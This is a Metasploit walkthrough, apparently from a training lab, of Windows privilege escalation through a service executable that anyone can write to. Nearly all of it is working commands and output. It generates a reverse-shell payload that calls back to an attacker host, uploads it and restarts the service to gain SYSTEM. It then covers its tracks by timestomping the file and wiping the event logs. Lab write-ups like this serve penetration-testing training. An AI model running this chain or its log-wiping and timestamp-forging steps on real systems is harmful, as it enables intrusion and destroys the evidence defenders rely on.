# Metasploit

# 01 - Detect

```
meterpreter > getuid
Server username: TCM-PC\user
meterpreter > shell
Process 2276 created.
Channel 14 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>wmic service get name, startname, pathname | findstr /i "localsystem" | findstr /i "c:\program files"
wmic service get name, startname, pathname | findstr /i "localsystem" | findstr /i "c:\program files"
filepermsvc                          "C:\Program Files\File Permissions Service\filepermservice.exe"                            LocalSystem

C:\Users\user>exit
exit
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > service_query filepermsvc

Name        : filepermsvc
Display     : File Permissions Service
Account     : LocalSystem
Status      : Stopped
Start Type  : Manual
Path        : "C:\Program Files\File Permissions Service\filepermservice.exe"
L.O. Group  : 
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;WD)

meterpreter > execute -Hicf icacls -a "\"C:\Program Files\File Permissions Service\filepermservice.exe\""
Process 2880 created.
Channel 2 created.
C:\Program Files\File Permissions Service\filepermservice.exe Everyone:(F)
                                                              NT AUTHORITY\SYSTEM:(I)(F)
                                                              BUILTIN\Administrators:(I)(F)
                                                              BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

## 02 - Exploit

Before we overwrite the program we must collect the timestamp values to clear our traces ahead of time in order to circumvent the forensics.

```
meterpreter > timestomp -v "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Showing MACE attributes for C:\Program Files\File Permissions Service\filepermservice.exe
Modified      : 2020-04-15 10:42:26 -0400
Accessed      : 2020-04-15 10:42:26 -0400
Created       : 2020-04-15 10:42:26 -0400
Entry Modified: 2020-04-15 10:42:26 -0400
```

Before downloading the binary we need to collect the hash value to verify the data integrity isn't corrupted.

```
meterpreter > checksum md5 "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Download the binary as a backup in case if it fails to start so we can revert back to original changes.

```
meterpreter > download "C:\Program Files\File Permissions Service\filepermservice.exe" backup
[*] Downloading: C:\Program Files\File Permissions Service\filepermservice.exe -> /home/user/backup/filepermservice.exe
[*] Downloaded 9.00 KiB of 9.00 KiB (100.0%): C:\Program Files\File Permissions Service\filepermservice.exe -> /home/user/backup/filepermservice.exe
[*] download   : C:\Program Files\File Permissions Service\filepermservice.exe -> /home/user/backup/filepermservice.exe
```

Generate a payload then upload it.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.145.108 lport=53 -f exe-service -o filepermservice.exe

meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/script/web_delivery) > jobs -K
Stopping all jobs...

[*] Server stopped.
msf6 exploit(multi/script/web_delivery) > handler -p windows/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53 -x
[*] Payload handler running as background job 1.

[*] Started reverse TCP handler on 10.8.145.108:53 
msf6 exploit(multi/script/web_delivery) > sessions -1
[*] Starting interaction with 1...

meterpreter > upload filepermservice.exe "C:\Program Files\File Permissions Service"
[*] uploading  : /home/user/Documents/thm/winprivesc/filepermservice.exe -> C:\Program Files\File Permissions Service
[*] uploaded   : /home/user/Documents/thm/winprivesc/filepermservice.exe -> C:\Program Files\File Permissions Service\filepermservice.exe
```

Finally to escalate privileges. Restart the service.

```
meterpreter > service_control filepermsvc start
[+] Operation start succeeded.
[*] Sending stage (200774 bytes) to 10.10.22.1
[*] Meterpreter session 2 opened (10.8.145.108:53 -> 10.10.22.1:49204) at 2022-05-28 08:57:12 -0400

meterpreter > sessions 2
[*] Backgrounding session 1...
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 03 - Cleanup

Migrate to another process in order to upload the legitimate binary otherwise you'll encounter permission error.

```
meterpreter > migrate -N lsass.exe
[*] Migrating from 1732 to 688...
[*] Migration completed successfully.
```

Upload the binary that was reserved as a backup then verify the hash data.

```
meterpreter > upload backup/filepermservice.exe "C:\Program Files\File Permissions Service"
[*] uploading  : /home/user/backup/filepermservice.exe -> C:\Program Files\File Permissions Service
[*] uploaded   : /home/user/backup/filepermservice.exe -> C:\Program Files\File Permissions Service\filepermservice.exe
meterpreter > checksum md5 "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Write the timestamp values that was collected.

```
meterpreter > timestomp -v "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Showing MACE attributes for C:\Program Files\File Permissions Service\filepermservice.exe
Modified      : 2022-05-28 09:59:31 -0400
Accessed      : 2020-04-15 10:42:26 -0400
Created       : 2020-04-15 10:42:26 -0400
Entry Modified: 2022-05-28 09:59:31 -0400
meterpreter > timestomp -e "04/15/2020 10:42:26" "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Setting specific MACE attributes on C:\Program Files\File Permissions Service\filepermservice.exe
meterpreter > timestomp -m "04/15/2020 10:42:26" "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Setting specific MACE attributes on C:\Program Files\File Permissions Service\filepermservice.exe
meterpreter > timestomp -v "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Showing MACE attributes for C:\Program Files\File Permissions Service\filepermservice.exe
Modified      : 2020-04-15 11:42:26 -0400
Accessed      : 2020-04-15 10:42:26 -0400
Created       : 2020-04-15 10:42:26 -0400
Entry Modified: 2020-04-15 11:42:26 -0400
```

Finally, clear the event logs.

```
meterpreter > clearev
[*] Wiping 912 records from Application...
[*] Wiping 2487 records from System...
[*] Wiping 798 records from Security...
```